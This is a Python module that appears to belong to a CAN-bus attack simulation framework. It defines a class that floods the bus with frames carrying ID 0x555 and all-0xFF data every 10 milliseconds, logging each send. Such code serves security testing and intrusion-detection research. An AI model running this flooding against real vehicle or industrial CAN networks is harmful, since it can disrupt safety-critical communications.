import logging
import time

from src.networking.can_interface import CANInterface
from src.attacks.base_attack import BaseAttack


logger = logging.getLogger(__name__)


class CANFloodAttack(BaseAttack):
    """
    Simulates a CAN flooding attack by sending
    a large number of messages rapidly.
    """

    ATTACK_CAN_ID = 0x555

    def run(self) -> None:
        """Continuously send CAN frames at a high rate."""

        while self.running:
            self.bus.send(
                arbitration_id=self.ATTACK_CAN_ID,
                data=[
                    0xFF,
                    0xFF,
                    0xFF,
                    0xFF,
                    0xFF,
                    0xFF,
                    0xFF,
                    0xFF,
                ],
            )

            logger.warning(
                "CAN Flood Attack -> ID=0x555"
            )

            # Very small delay to simulate high-rate traffic.
            time.sleep(0.01)
